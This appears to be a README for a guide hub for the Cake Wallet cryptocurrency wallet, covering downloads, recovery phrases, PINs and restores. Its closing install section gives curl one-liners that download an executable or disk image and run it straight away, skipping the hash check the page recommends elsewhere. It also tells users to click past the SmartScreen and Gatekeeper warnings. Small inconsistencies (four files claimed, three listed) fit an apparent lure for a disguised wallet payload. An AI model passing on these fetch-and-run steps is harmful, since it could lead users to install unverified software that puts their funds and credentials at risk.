![Cake Wallet Guides: Install, Set Up and Restore](assets/cake-wallet-guide-help-hub-banner.png)

# Cake Wallet Guides: Install, Set Up and Restore

Every step from the download to a wallet you can actually recover.

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/blob/main/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

> Start with the install page for your platform. The phrase you write down in the first five minutes is the difference between a wallet and a screen of numbers you cannot get back.

## What this repository is for
This repository holds the setup side of Cake Wallet: getting the app onto a device, choosing a PIN, writing down the recovery phrase and restoring a wallet when something has gone wrong. It exists because most wallet losses are not hacks. They are a phrase that was never written down, a restore started with the wrong seed type, or a paper backup that was thrown away after an import looked successful. Each page here takes one of those situations and walks through it in the order the app presents it, with the failure modes named before they happen. The guides cover Windows, macOS, Linux, Android and iOS separately, because the installer format decides half of the procedure. They also cover the parts of the app that people skip: accounts and subaddresses, watch-only wallets, duress PINs and the difference between a wallet backup and a phone backup. Nothing here promises a feature for a build that does not have it; where the shipped desktop release predates something, the page says so and points at the current app line instead. Every page assumes the reader has the app open in front of them. Where a menu name differs between builds, the page describes the route rather than one frozen label, because a screenshot of an older build is worse than no screenshot at all. Where a step cannot be undone, such as deleting a wallet or sweeping an old paper key, the page says so before the step rather than after it.

## Who it is for
- Someone installing Cake Wallet for the first time and not sure which file on the release page is theirs.
- Anyone restoring a wallet on a new phone, a new laptop or after a reinstall.
- People holding a paper backup or an old seed phrase who need to know which restore route applies.
- Readers who want a second wallet, a watch-only view or a duress PIN without losing track of the phrases.
- Anyone who has just wiped a phone or a laptop and needs the wallet back without repeating the mistakes that made the restore necessary.

## Start here
- [cake-wallet-windows-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) - Install the Windows build, clear the SmartScreen prompt and check the file you downloaded before you run it.
- [cake-wallet-restore-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) - Restore from a phrase, a private key or a backup file, including the 25-word Monero case.
- [cake-wallet-backup-recovery-phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) - Write down and test the phrase that brings the wallet back when the device is gone.
- [cake-wallet-setup-pin](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) - Choose a PIN, understand what it protects and finish first-run setup without locking yourself out later.

## How to use these guides
1. Install the build for your platform from the download table above, and check the file against the hash on the release page.
2. Open the app, set a PIN you will still remember next month, and write the recovery phrase on paper before funding anything.
3. Read the one page that matches your situation: first wallet, restore, second wallet or a forgotten PIN.
4. Follow the links at the end of a page only when its task is finished; each one is the next step, not background reading.
5. Keep the phrase somewhere the device is not. A screenshot on the same phone is not a backup.
6. When a page links to another repository, follow it only once the current task is finished; the links are the next task, not extra reading.

## The guides
### Install the app
- [cake-wallet-windows-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) - Install the Windows build, clear the SmartScreen prompt and check the file you downloaded before you run it.
- [cake-wallet-macos-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-macos-install.md) - Install on macOS, open the disk image and clear Gatekeeper the first time the wallet launches.
- [cake-wallet-linux-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-linux-install.md) - Install on Linux from the portable archive or the Flatpak, with the steps each format actually needs.
- [cake-wallet-android-apk](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-android-apk.md) - Pick the right Android route, choose the correct APK architecture and handle the Play Protect warning.
- [cake-wallet-ios-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-ios-install.md) - Install from the App Store on iPhone or iPad and restore an existing wallet onto the new device.

### Set up and recover
- [cake-wallet-setup-pin](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-setup-pin.md) - Choose a PIN, understand what it protects and finish first-run setup without locking yourself out later.
- [cake-wallet-backup-recovery-phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) - Write down and test the phrase that brings the wallet back when the device is gone.
- [cake-wallet-restore-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) - Restore from a phrase, a private key or a backup file, including the 25-word Monero case.
- [cake-wallet-forgot-pin](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-forgot-pin.md) - Read the failed-authentication countdown correctly and use the phrase, not guesses, as the way back.

### Wallets and keys
- [cake-wallet-multiple-wallets](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) - Keep several wallets with separate phrases, each named and backed up without losing track of either.
- [cake-wallet-monero-accounts-subaddresses](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md) - See how wallets, accounts and subaddresses nest, and why the wrong account looks like a missing deposit.
- [cake-wallet-paper-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md) - Restore words or keys from paper, and understand why the app has no sweep button for old wallets.
- [cake-wallet-watch-only](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-watch-only.md) - Add an xpub-only Bitcoin wallet that shows balances, receives normally and cannot spend anything.
- [cake-wallet-duress-pin](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-duress-pin.md) - Understand the second PIN, the coercion threat it addresses and the things it cannot protect.

## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Get the app running | [cake-wallet-windows-install](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-windows-install.md) | A verified installer and a wallet that opens |
| Recover a lost phone | [cake-wallet-restore-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) | The same wallet, same addresses, same history |
| Protect the backup | [cake-wallet-backup-recovery-phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) | A phrase you have tested, not just written |
| Add a second wallet | [cake-wallet-multiple-wallets](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) | Separate phrases, kept apart on purpose |
| Import old paper | [cake-wallet-paper-wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-paper-wallet.md) | Keys in the app, with the old address emptied |
| Lock the app down | [cake-wallet-duress-pin](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-duress-pin.md) | A second PIN for a situation you hope never happens |

## Common first questions
### Which file do I download?
The download table lists one file per desktop platform, and the release page lists the same four files. If the name on your disk is not one of them, it is not this release.

### Do I need the phrase if I have the PIN?
Yes. The PIN unlocks the app on this device; the phrase is what recreates the wallet anywhere else. There is no PIN recovery.

### Can I use the same phrase on two devices?
You can, and both will spend the same funds, which is rarely what you want. A second wallet with its own phrase is the safer way to run two devices.

### What if the app will not open?
Install the current build over the existing one first; that keeps the wallet and fixes most startup faults. Only reinstall after you have confirmed the phrase.

### I already had a wallet on an old phone. Where is its phrase?
It is wherever you wrote it when the wallet was created; the app cannot show it again after a wipe. If it was never written down, no page here can recover the funds.

## Before you install
- Write the recovery phrase on paper and read it back before you fund the wallet.
- Check the downloaded file's SHA-256 against the release page.
- Know which platform file you need before you start, so you do not install the wrong one.
- Have a second device or a password manager entry for the phrase's location, never the phrase itself in chat.
- Check that you know which wallet a phrase belongs to before you need it; two phrases without labels restore the wrong wallet.

## About and license
Cake Wallet is an open-source, non-custodial multi-currency wallet by Cake Labs. The source in this repository is licensed MIT; read `LICENSE.md` for the exact terms. These pages describe the app as documented at the time of writing and make no promise about builds that are not published here.

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
No one-line command is published for Linux. The release ships a compressed archive, not an installer the shell can launch, so the download either needs extracting or needs the Flatpak build instead. Extract it with your file manager, or unpack it in a terminal with `tar -xf`, then run the executable inside the folder.

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> for the portable build, or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a> if your distribution prefers Flatpak.
2. For the archive, extract it and keep the whole folder together.
3. For the Flatpak file, install it with your software centre, or run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak`.
4. Run the app from the extracted folder or from your application menu.

<!-- INSTALL-END -->
